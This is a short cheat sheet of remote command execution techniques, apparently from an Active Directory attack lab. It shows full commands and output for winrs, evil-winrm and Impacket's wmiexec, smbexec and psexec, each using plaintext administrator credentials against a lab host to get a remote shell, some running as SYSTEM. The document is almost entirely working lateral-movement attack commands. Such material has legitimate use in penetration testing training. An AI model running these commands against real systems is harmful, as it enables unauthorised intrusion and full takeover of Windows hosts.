# Remote Command Execute

## WinRS

```text
PS C:\Users\testuser> winrs.exe -r:odin.valhalla.local -u:administrator -p:Pass123! "cmd /c whoami & hostname & ipconfig
"
valhalla\administrator
odin

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::d130:77d8:36c:afe%12
   IPv4 Address. . . . . . . . . . . : 192.168.200.100
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :

Tunnel adapter isatap.{82B0F91C-D6B0-48AA-935A-1CCE190951A5}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```

## Evil-WinRM

```text
┌──(kali㉿kali)-[~/Desktop/ADAbuse]
└─$ evil-winrm -i 192.168.200.100 -u administrator -p Pass123!                                                                                     1 ⚙

Evil-WinRM shell v3.2

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> pwd

Path
----
C:\Users\Administrator\Documents


*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
valhalla\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

## Impacket

### wmiexec

```text
┌──(kali㉿kali)-[~/Desktop/ADAbuse]
└─$ /usr/bin/impacket-wmiexec valhalla/administrator:Pass123\!@192.168.200.100                                                                 1 ⨯ 1 ⚙
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
valhalla\administrator
```

### smbexec

```text
┌──(kali㉿kali)-[~/Desktop/ADAbuse]
└─$ /usr/bin/impacket-smbexec valhalla/administrator:Pass123\!@192.168.200.100                                                                     1 ⚙
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

### psexec

```text
┌──(kali㉿kali)-[~/Desktop/ADAbuse]
└─$ /usr/bin/impacket-psexec valhalla/administrator:Pass123\!@192.168.200.100                                                                  1 ⨯ 1 ⚙
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 192.168.200.100.....
[*] Found writable share ADMIN$
[*] Uploading file SJmjamtF.exe
[*] Opening SVCManager on 192.168.200.100.....
[*] Creating service qeWU on 192.168.200.100.....
[*] Starting service qeWU.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

